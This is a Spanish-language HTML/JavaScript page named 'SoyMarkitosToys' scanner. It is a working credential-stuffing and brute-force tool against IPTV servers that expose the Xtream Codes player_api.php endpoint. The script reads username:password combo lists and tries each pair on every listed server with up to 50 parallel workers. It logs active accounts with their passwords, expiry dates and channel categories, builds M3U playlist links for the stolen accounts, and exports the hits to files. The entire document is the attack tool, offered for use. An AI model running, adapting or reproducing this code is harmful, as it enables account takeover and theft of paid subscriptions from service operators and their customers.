<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1" /><title>SOYMARKITOSTOYS - SCANNER</title><style>  * { box-sizing: border-box; margin: 0; padding: 0; }    /* Paleta Neo-Futurista: Fondo Cyber-Negro, Detalles Verde Neón Eléctrico y Oro */  body { background-color: #05080c; color: #39ff14; font-family: 'Segoe UI', sans-serif; user-select: none; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }    #main-app { width: 100%; max-width: 900px; margin: 0 auto; padding: 25px; background: #0d1117; border-radius: 16px; box-shadow: 0 0 30px rgba(57, 255, 20, 0.25); border: 1px solid #39ff14; }    h1 { text-align: center; margin-bottom: 25px; text-shadow: 0 0 15px #39ff14; display: flex; align-items: center; justify-content: center; gap: 12px; font-size: 2.2rem; color: #fff; }    .rayo-icono { font-size: 2.5rem; filter: drop-shadow(0 0 10px #ffaa00); animation: brillo 2s infinite; }    @keyframes brillo { 0% { filter: drop-shadow(0 0 5px #ffaa00); } 50% { filter: drop-shadow(0 0 15px #ffaa00); } 100% { filter: drop-shadow(0 0 5px #ffaa00); } }    .titulo-texto { background: linear-gradient(135deg, #39ff14, #00ffcc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900; }      /* Estilo corregido para forzar una sola línea en móviles */  .creditos-autor { text-align: center; font-size: 0.95rem; color: #ffd700; margin-top: 25px; font-weight: 900; font-family: 'Courier New', monospace; letter-spacing: 2px; text-shadow: 0 0 12px #ffd700, 0 0 20px rgba(255, 215, 0, 0.5); border-top: 1px dashed rgba(57, 255, 20, 0.2); padding-top: 15px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }    textarea, input[type="number"], input[type="file"] { width: 100%; margin-bottom: 15px; padding: 12px; border-radius: 10px; border: 2px solid #39ff14; background: #020408; color: #39ff14; outline: none; font-family: monospace; }    textarea:focus, input[type="number"]:focus { box-shadow: 0 0 10px rgba(57, 255, 20, 0.5); }  label { font-weight: 600; display: block; margin-bottom: 5px; color: #fff; letter-spacing: 0.5px; }      .btn { background: #39ff14; border: none; color: #05080c; font-weight: bold; padding: 12px 24px; border-radius: 8px; cursor: pointer; margin: 5px 8px 5px 0; font-size: 1.1rem; transition: all 0.3s; min-width: 140px; text-shadow: none; }    .btn:hover { background: #00ffcc; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 255, 204, 0.4); color: #05080c; }    .btn.running { background: #ff3c38; color: #fff; animation: pulse 1.5s infinite; }    .btn.bruteforce-active { background: #ff9800 !important; color: #000 !important; border: 2px solid #ffaa00; box-shadow: 0 0 15px #ff9800; }    @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.8; } 100% { opacity: 1; } }        /* Status bar Neo-Futurista */    #status-bar {     margin: 20px 0;     padding: 15px;     background: #020408;     border-radius: 12px;     border: 2px solid #39ff14;     color: #39ff14 !important;     text-align: center;     box-shadow: inset 0 0 10px rgba(57, 255, 20, 0.2);  }      #status-bar span,   #status-bar span span,  .separator {    color: #39ff14 !important;  }        .tabs { margin-top: 20px; display: flex; gap: 5px; }    .tab-btn { background: transparent; border: 2px solid #39ff14; border-bottom: none; padding: 10px 25px; color: #39ff14; cursor: pointer; font-weight: bold; border-radius: 12px 12px 0 0; transition: all 0.2s; }    .tab-btn.active { background: #39ff14; color: #05080c; }      .tab-content { background: #020408; border: 2px solid #39ff14; padding: 20px; height: 350px; overflow-y: auto; border-radius: 0 12px 12px 12px; color: #39ff14; font-family: 'Courier New', monospace; white-space: pre-wrap; }    pre { margin: 10px 0; padding: 15px; background: #0d1117; border-radius: 10px; border: 1px solid #39ff14; color: #fff; box-shadow: inset 0 0 8px rgba(57, 255, 20, 0.1); }      .btn-group { display: flex; flex-wrap: wrap; gap: 10px; margin: 20px 0; justify-content: center; }    .server-status { margin: 15px 0; padding: 15px; background: #020408; border-radius: 12px; border: 2px solid #39ff14; }    #serverList { display: flex; flex-direction: column; gap: 8px; }    .server-item { display: flex; align-items: center; gap: 12px; padding: 12px; background: #0d1117; border-radius: 8px; border: 1px solid rgba(57, 255, 20, 0.2); }    .status-indicator { width: 12px; height: 12px; border-radius: 50%; }    .status-indicator.online { background: #39ff14; box-shadow: 0 0 10px #39ff14; }    .status-indicator.offline { background: #ff3c38; box-shadow: 0 0 10px #ff3c38; }    .status-indicator.checking { background: #ffd700; box-shadow: 0 0 10px #ffd700; }    .server-url { flex: 1; color: #fff; word-break: break-all; }      .bruteforce-panel { background: #020408; border: 2px solid #39ff14; border-radius: 12px; padding: 20px; margin: 20px 0; }    .bruteforce-header { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; }    .server-group-header { background: #0d1117; color: #39ff14; padding: 8px 12px; margin: 15px 0 5px 0; border-radius: 6px; font-weight: bold; border-left: 4px solid #39ff14; }    .log-hit, .log-fail, .log-error, .log-info { color: #39ff14 !important; }    #btn-toggle-bruteforce { display: flex; align-items: center; justify-content: center; }</style></head><body><div id="main-app">    <h1><span class="titulo-texto">🐲 SoyMarkitosToys 🐉</span></h1>      <label for="servidores">📡 Servidores (uno por linea)</label>    <textarea id="servidores" rows="4" placeholder="ej: http://servidor1.com:80&#10;https://servidor2.com:80" oninput="verificarServidoresEnTiempoReal()"></textarea>        <div id="serverStatusContainer" class="server-status" style="display: none;">        <h4>🌐 Estado de Servidores:</h4>        <div id="serverList"></div>    </div>        <div class="bruteforce-panel">        <div class="bruteforce-header">            <h3>⚡ MODO FUERZA BRUTA</h3>            <button id="btn-toggle-bruteforce" class="btn">ACTIVAR BRUTEFORCE</button>        </div>    </div>        <label for="comboFile1">Archivo Combo 1</label>    <input type="file" id="comboFile1" accept=".txt" style="margin-bottom:8px" />    <label for="comboFile2">Archivo Combo 2</label>    <input type="file" id="comboFile2" accept=".txt" style="margin-bottom:8px" />    <label for="comboFile3">Archivo Combo 3</label>    <input type="file" id="comboFile3" accept=".txt" />        <label for="threads">⚙️ Hilos (1 a 50)</label>    <input type="number" id="threads" min="1" max="50" value="10" />        <div class="btn-group">        <button id="btn-start" class="btn btn-start">INICIAR ESCANEO</button>        <button id="btn-save-combos" class="btn btn-save-combos">GUARDAR COMBOS</button>        <button id="btn-save-hits" class="btn btn-save-hits">GUARDAR HITS</button>        <button id="btn-clear" class="btn btn-clear">LIMPIAR TODO</button>  </div>          <div id="status-bar">        <span>Estado: <span id="statusText">Detenido</span></span> <span class="separator">|</span>        <span>Verificados: <span id="checkedCount">0</span></span> <span class="separator">|</span>        <span>Hits: <span id="hitsCount">0</span></span> <span class="separator">|</span>        <span>CPM: <span id="cpmCount">0</span></span> <span class="separator">|</span>        <span>Total Combos: <span id="totalCount">0</span></span>        <span id="serversOnlineCount" style="display:none;">0</span>        <span id="serversTotalCount" style="display:none;">0</span>    </div>        <div class="tabs">        <button class="tab-btn active" data-tab="activity">📋 Actividad</button>        <button class="tab-btn" data-tab="hits">✅ Hits</button>    </div>        <div id="activity" class="tab-content"></div>    <div id="hits" class="tab-content" style="display:none;"></div>    <div class="creditos-autor">⚡ HECHO POR AMBROSINI ⚡</div></div><script>        let isBruteforceMode = false;        let serverStatus = new Map();        let onlineServers = [];        let isScanning = false;        let abortControllers = [];        let startTime, cpmInterval;        let serversWithHits = new Set();        let sessionFileName = null;            let accumulatedHits = [];            function getServerDisplayName(serverUrl) {            try {                let clean = serverUrl.replace(/^https?:\/\//, '');                clean = clean.replace(/:\d+$/, '');                clean = clean.replace(/\/$/, '');                return clean;            } catch { return serverUrl; }        }        function getServerNameForFile(serverUrl) {            try {                let clean = serverUrl.replace(/^https?:\/\//, '');                clean = clean.replace(/:\d+$/, '');                clean = clean.replace(/\/$/, '');                clean = clean.replace(/[^a-zA-Z0-9]/g, '_');                return clean;            } catch { return 'unknown'; }        }            document.getElementById('btn-toggle-bruteforce').addEventListener('click', function() {            isBruteforceMode = !isBruteforceMode;            const btn = this;            if (isBruteforceMode) {                btn.textContent = 'DESACTIVAR BRUTEFORCE';                btn.classList.add('bruteforce-active');                log('activity', '⚡ MODO FUERZA BRUTA ACTIVADO', 'info');            } else {                btn.textContent = 'ACTIVAR BRUTEFORCE';                btn.classList.remove('bruteforce-active');                log('activity', '🔵 MODO NORMAL ACTIVADO', 'info');            }        });            async function verificarServidor(serverUrl) {            const serverClean = serverUrl.trim().replace(/\/$/, '');            try {                const controller = new AbortController();                const timeoutId = setTimeout(() => controller.abort(), 5000);                await fetch(`${serverClean}/player_api.php`, { signal: controller.signal, mode: 'no-cors' });                clearTimeout(timeoutId);                return { online: true, url: serverClean };            } catch { return { online: false, url: serverClean }; }        }            async function verificarServidoresEnTiempoReal() {            const textarea = document.getElementById('servidores');            if (!textarea) return;            const servers = textarea.value.trim().split('\n').filter(s => s.trim() !== '');            const container = document.getElementById('serverStatusContainer');            const serverList = document.getElementById('serverList');            const serversOnlineSpan = document.getElementById('serversOnlineCount');            const serversTotalSpan = document.getElementById('serversTotalCount');                  if (servers.length === 0) {                if (container) container.style.display = 'none';                if (serversOnlineSpan) serversOnlineSpan.textContent = '0';                if (serversTotalSpan) serversTotalSpan.textContent = '0';                onlineServers = [];                return;            }                  if (container) container.style.display = 'block';            if (serversTotalSpan) serversTotalSpan.textContent = servers.length;                  serverStatus.clear();            if (serverList) serverList.innerHTML = '';            onlineServers = [];                  servers.forEach((server, index) => {                if (!serverList) return;                const item = document.createElement('div');                item.className = 'server-item checking';                item.id = `server-${index}`;                item.innerHTML = `<span class="status-indicator checking"></span><span class="server-url">${server.trim()}</span><span class="server-status-text">Verificando...</span>`;                serverList.appendChild(item);            });                  const promises = servers.map(async (server, index) => {                const res = await verificarServidor(server);                const item = document.getElementById(`server-${index}`);                if (!item) return;                if (res.online) {                    item.className = 'server-item online';                    item.querySelector('.status-indicator').className = 'status-indicator online';                    item.querySelector('.server-status-text').textContent = 'Online ✅';                    serverStatus.set(server.trim(), true);                    onlineServers.push(server.trim());                } else {                    item.className = 'server-item offline';                    item.querySelector('.status-indicator').className = 'status-indicator offline';                    item.querySelector('.server-status-text').textContent = 'Offline ❌';                    serverStatus.set(server.trim(), false);                }                if (serversOnlineSpan) serversOnlineSpan.textContent = onlineServers.length;            });            await Promise.all(promises);            log('activity', `🌍 Verificación: ${onlineServers.length}/${servers.length} servidores online`, 'info');        }        function getActiveServers() {            const all = document.getElementById('servidores').value.trim().split('\n').filter(s => s.trim() !== '');            return all.filter(s => serverStatus.get(s.trim()) === true);        }            async function getCombosFromFile() {            const inputs = ['comboFile1','comboFile2','comboFile3'].map(id => document.getElementById(id));            const combos = [];            for (const input of inputs) {                if (!input || !input.files || !input.files[0]) continue;                const text = await input.files[0].text();                const lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => l && l.includes(':'));                lines.forEach(l => {                    const [u, p] = l.split(':');                    if (u && p) combos.push(`${u.trim()}:${p.trim()}`);                });            }            if (combos.length === 0) { alert('⚠️ Selecciona al menos un archivo combo'); return null; }            return combos;        }            function formatearFechaConDia(fecha) {            return fecha.toLocaleString('es-ES', {                weekday: 'long', year: 'numeric', month: 'long', day: 'numeric'            });        }        function formatearHora(fecha) {            return fecha.toLocaleTimeString('es-ES', {                hour: '2-digit', minute: '2-digit', second: '2-digit'            });        }        function formatearFechaExpiracion(timestamp) {            if (!timestamp) return 'N/A';            const fecha = new Date(timestamp * 1000);            return fecha.toLocaleString('es-ES', {                weekday: 'short', year: 'numeric', month: 'short', day: 'numeric'            });        }        function obtenerUsuariosConectados(info) {            return info.active_connections ?? info.num_connections ?? info.connections ?? 0;        }            async function obtenerCategoriasLive(server, user, pass) {            try {                const url = `${server}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_live_categories`;                const ctrl = new AbortController();                const timeoutId = setTimeout(() => ctrl.abort(), 8000);                        const res = await fetch(url, { signal: ctrl.signal });                clearTimeout(timeoutId);                        if (!res.ok) {                    console.log(`Error HTTP: ${res.status}`);                    return '❌ Error al obtener categorías';                }                        const data = await res.json();                        if (Array.isArray(data) && data.length > 0) {                    const total = data.length;                    const primeras = data.slice(0, 30).map(c => '☠️' + c.category_name).join(' ');                    return total > 30 ? `${primeras} ... (${total - 30} más)` : primeras;                } else if (data && typeof data === 'object') {                    try {                        const url2 = `${server}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;                        const res2 = await fetch(url2, { signal: AbortSignal.timeout(5000) });                        const data2 = await res2.json();                                    if (data2 && data2.live_categories && Array.isArray(data2.live_categories)) {                            const total = data2.live_categories.length;                            const primeras = data2.live_categories.slice(0, 30).map(c => '☠️' + c.category_name).join(' ');                            return total > 30 ? `${primeras} ... (${total - 30} más)` : primeras;                        }          } catch (e) {                        console.log('Error en segunda intento:', e);                    }                    return '✅ Sin categorías (pero cuenta activa)';                }                return '✅ Sin categorías disponibles';            } catch (error) {                console.log('Error obteniendo categorías:', error);                if (error.name === 'AbortError') {                    return '⏳ Tiempo de espera agotado';                }                return '❌ No se pudieron cargar';            }        }            async function agregarInfoCategorias(preElement, serverClean, user, pass) {            if (!preElement) return;                  const categoriesLive = await obtenerCategoriasLive(serverClean, user, pass);                  const textoActual = preElement.textContent;            const textoConCategorias = textoActual.replace(                '📺 Iptv: cargando...',                `📺 Iptv: ${categoriesLive}`            );            preElement.textContent = textoConCategorias;        }            function agregarHitAlPanel(texto, servidor) {            const panel = document.getElementById('hits');            if (!panel) return;            if (!serversWithHits.has(servidor)) {                serversWithHits.add(servidor);                const h = document.createElement('div');                h.className = 'server-group-header';                h.textContent = `🌐 Servidor: ${servidor}`;                panel.appendChild(h);            }            const pre = document.createElement('pre');            pre.textContent = texto;            panel.appendChild(pre);        }            function generarContenidoCombos() {            const pres = document.querySelectorAll('#hits pre');            const combos = [];            pres.forEach(pre => {                const lines = pre.textContent.split('\n');                let user = null, pass = null;                for (let l of lines) {                    if (l.includes('Usuario:')) user = l.split('Usuario:')[1]?.trim();                    if (l.includes('Contraseña:')) pass = l.split('Contraseña:')[1]?.trim();                    if (user && pass) break;                }                if (user && pass) combos.push(`${user}:${pass}`);            });            return combos.join('\n');        }            async function guardarCombosHits() {            const contenido = generarContenidoCombos();            if (!contenido.trim()) { alert('No hay combos para guardar.'); return; }            const servers = getActiveServers();            let sname = 'unknown';            if (servers.length) sname = getServerNameForFile(servers[0]);            if (servers.length > 1) sname = 'multi_' + sname;            const fecha = new Date();            const f = `${fecha.getFullYear()}${(fecha.getMonth()+1).toString().padStart(2,'0')}${fecha.getDate().toString().padStart(2,'0')}`;            const nombre = `Combos_${sname}_${f}.txt`;            guardarArchivo(contenido, nombre);        }            function generarContenidoHits() {            const hitsDiv = document.getElementById('hits');            if (!hitsDiv) return '';            const children = hitsDiv.children;            let contenido = '';            for (let child of children) {                if (child.classList.contains('server-group-header')) {                    contenido += child.textContent + '\n';                } else if (child.tagName === 'PRE') {                    contenido += child.textContent + '\n\n';                }            }            return contenido;        }            async function guardarHits() {            const contenido = generarContenidoHits();            if (!contenido.trim()) { alert('No hay hits para guardar.'); return; }            const servers = getActiveServers();            let sname = 'unknown';            if (servers.length) sname = getServerNameForFile(servers[0]);            if (servers.length > 1) sname = 'multi_' + sname;            const fecha = new Date();            const f = `${fecha.getFullYear()}${(fecha.getMonth()+1).toString().padStart(2,'0')}${fecha.getDate().toString().padStart(2,'0')}`;            const nombre = `Hits_${sname}_${f}.txt`;            guardarArchivo(contenido, nombre);        }            async function guardarArchivo(contenido, nombreSugerido) {            if ('showSaveFilePicker' in window) {                try {                    const handle = await window.showSaveFilePicker({                        suggestedName: nombreSugerido,                        types: [{ description: 'Archivo de texto', accept: {'text/plain':['.txt']} }]                    });                    const writable = await handle.createWritable();                    await writable.write(contenido);                    await writable.close();                    alert(`✅ Guardado como ${handle.name}`);                } catch (err) {                    if (err.name !== 'AbortError') {                        console.error(err);                        fallback(contenido, nombreSugerido);                    }                }            } else {                fallback(contenido, nombreSugerido);            }        }        function fallback(contenido, nombre) {            const blob = new Blob([contenido], {type:'text/plain'});            const a = document.createElement('a');            a.href = URL.createObjectURL(blob);            a.download = nombre;            a.click();            URL.revokeObjectURL(a.href);            alert(`✅ Guardado como ${nombre}`);        }            function clearLogs() {            document.getElementById('servidores').value = '';            ['comboFile1','comboFile2','comboFile3'].forEach(id => { const el = document.getElementById(id); if (el) el.value = ''; });            document.getElementById('threads').value = '10';            if (isBruteforceMode) {                isBruteforceMode = false;                const btn = document.getElementById('btn-toggle-bruteforce');                if (btn) { btn.textContent = 'ACTIVAR BRUTEFORCE'; btn.classList.remove('bruteforce-active'); }            }            const container = document.getElementById('serverStatusContainer');            if (container) container.style.display = 'none';            document.getElementById('serverList').innerHTML = '';            serverStatus.clear(); onlineServers = [];            document.getElementById('activity').innerHTML = '';            document.getElementById('hits').innerHTML = '';            document.getElementById('checkedCount').textContent = '0';            document.getElementById('hitsCount').textContent = '0';            document.getElementById('cpmCount').textContent = '0';            document.getElementById('totalCount').textContent = '0';            document.getElementById('statusText').textContent = 'Detenido';            document.getElementById('serversOnlineCount').textContent = '0';            document.getElementById('serversTotalCount').textContent = '0';            const btnStart = document.querySelector('.btn-start');            if (btnStart) { btnStart.textContent = 'INICIAR ESCANEO'; btnStart.classList.remove('running'); }            if (isScanning) {                abortControllers.forEach(c => c.abort());                abortControllers = [];                clearInterval(cpmInterval);                isScanning = false;            }            serversWithHits.clear();            sessionFileName = null;            accumulatedHits = [];            log('activity', '🧹 Todo limpiado', 'info');            alert('✅ Todo limpiado');        }            function log(pane, msg, type) {            const el = document.getElementById(pane);            if (!el) return;            const d = document.createElement('div');            d.className = `log-${type}`;            d.textContent = msg;            el.appendChild(d);            el.scrollTop = el.scrollHeight;        }        function updateCPM(checked) {            const elapsed = (Date.now() - startTime) / 1000 / 60;            if (elapsed > 0) document.getElementById('cpmCount').textContent = Math.round(checked / elapsed);        }            async function stopScan() {            isScanning = false;            abortControllers.forEach(c => c.abort());            abortControllers = [];            clearInterval(cpmInterval);                        log('activity', '🛑 DETENIDO', 'info');            document.getElementById('statusText').textContent = 'Detenido';            const btn = document.querySelector('.btn-start');            if (btn) { btn.textContent = 'INICIAR ESCANEO'; btn.classList.remove('running'); }        }            async function startScan() {            if (isScanning) { stopScan(); return; }            const activeServers = getActiveServers();            const threads = parseInt(document.getElementById('threads').value, 10);            if (activeServers.length === 0) { alert('No hay servidores activos.'); return; }            const combos = await getCombosFromFile();            if (!combos) return;            isScanning = true;            const btnStart = document.querySelector('.btn-start');            if (btnStart) { btnStart.textContent = 'DETENER ESCANEO'; btnStart.classList.add('running'); }            document.getElementById('statusText').textContent = 'Ejecutando';            const primerServidor = activeServers[0];            const serverNameForFile = getServerNameForFile(primerServidor);            const fecha = new Date();            const fechaStr = `${fecha.getFullYear()}${(fecha.getMonth()+1).toString().padStart(2,'0')}${fecha.getDate().toString().padStart(2,'0')}`;            sessionFileName = `Hits_${serverNameForFile}_${fechaStr}.txt`;            accumulatedHits = [];            let checked = 0, hits = 0;            document.getElementById('checkedCount').textContent = '0';            document.getElementById('hitsCount').textContent = '0';            document.getElementById('cpmCount').textContent = '0';            const tasks = [];            for (const combo of combos) {                for (const s of activeServers) tasks.push({ combo, servidor: s });            }            document.getElementById('totalCount').textContent = tasks.length;            startTime = Date.now();            cpmInterval = setInterval(() => updateCPM(checked), 2000);            const timeoutMs = isBruteforceMode ? 3000 : 5000;            const worker = async () => {                while (tasks.length > 0 && isScanning) {                    const task = tasks.shift();                    if (!task) continue;                    const [user, pass] = task.combo.split(':', 2);                    if (!user || !pass) continue;                    const serverClean = task.servidor.trim().replace(/\/$/, '');                    try {                        const ctrl = new AbortController();                        abortControllers.push(ctrl);                        const tid = setTimeout(() => ctrl.abort(), timeoutMs);                        const res = await fetch(`${serverClean}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`, { signal: ctrl.signal });                        clearTimeout(tid);                        if (!res.ok) throw new Error(`HTTP ${res.status}`);                        const data = await res.json();                        if (data?.user_info?.status?.toLowerCase() === 'active') {                            hits++;                            const info = data.user_info;                            const ahora = new Date();                            const conectados = obtenerUsuariosConectados(info);                                          log('activity', `✅ [HIT] ${user}:${pass} en ${serverClean}`, 'hit');                                                        const resultado = ` 🐲 𝗦𝗢𝗬𝗠𝗔𝗥𝗞𝗜𝗧𝗢𝗦𝗧𝗢𝗬𝗦 𝗛𝗜𝗧𝗦🐉${'═'.repeat(30)}\n📅 Fecha: ${formatearFechaConDia(ahora)}\n🕒 Hora: ${formatearHora(ahora)}\n🌐 Servidor: ${serverClean}\n👤 Usuario: ${user}\n👥 Conectados: ${conectados}\n🔐 Contraseña: ${pass}\n⏳ Expira: ${formatearFechaExpiracion(info.exp_date)}\n🔝 Conexiones: ${info.max_connections}\n✅ Estado: ${info.status}\n📺 Iptv: cargando...\n${'═'.repeat(30)}\n🔗 M3U: ${serverClean}/get.php?username=${user}&password=${pass}&type=m3u_plus`;                            agregarHitAlPanel(resultado, serverClean);                                                        const lastPre = document.querySelector('#hits pre:last-child');                            if (lastPre) {                                await agregarInfoCategorias(lastPre, serverClean, user, pass);                            }                                          const textoActualizado = lastPre ? lastPre.textContent : resultado;                            accumulatedHits.push(textoActualizado + '\n\n');                        } else {                            log('activity', `❌ [FAIL] ${user}:${pass} en ${serverClean}`, 'fail');                        }          } catch (e) {                        if (e.name !== 'AbortError') {                            log('activity', `[ERROR] ${user}:${pass} en ${serverClean} - ${e.message}`, 'error');                        }          } finally {                        checked++;                        abortControllers = abortControllers.filter(c => !c.signal.aborted);                        document.getElementById('checkedCount').textContent = checked;                        document.getElementById('hitsCount').textContent = hits;                    }                }            };            const workers = Array.from({ length: threads }, () => worker());            await Promise.all(workers);            stopScan();            log('activity', `✅ COMPLETADO. Hits: ${hits}`, 'hit');        }            function showTab(tab) {            document.querySelectorAll('.tab-btn').forEach(b => b.classList.toggle('active', b.dataset.tab === tab));            document.getElementById('activity').style.display = tab === 'activity' ? 'block' : 'none';            document.getElementById('hits').style.display = tab === 'hits' ? 'block' : 'none';        }            document.addEventListener('DOMContentLoaded', function() {            document.querySelector('.btn-start').addEventListener('click', e => { e.preventDefault(); startScan(); });            document.querySelector('.btn-save-combos').addEventListener('click', e => { e.preventDefault(); guardarCombosHits(); });            document.querySelector('.btn-save-hits').addEventListener('click', e => { e.preventDefault(); guardarHits(); });            document.querySelector('.btn-clear').addEventListener('click', e => { e.preventDefault(); clearLogs(); });            document.querySelectorAll('.tab-btn').forEach(t => t.addEventListener('click', e => { e.preventDefault(); showTab(t.dataset.tab); }));            setTimeout(verificarServidoresEnTiempoReal, 500);        });</script></body></html>
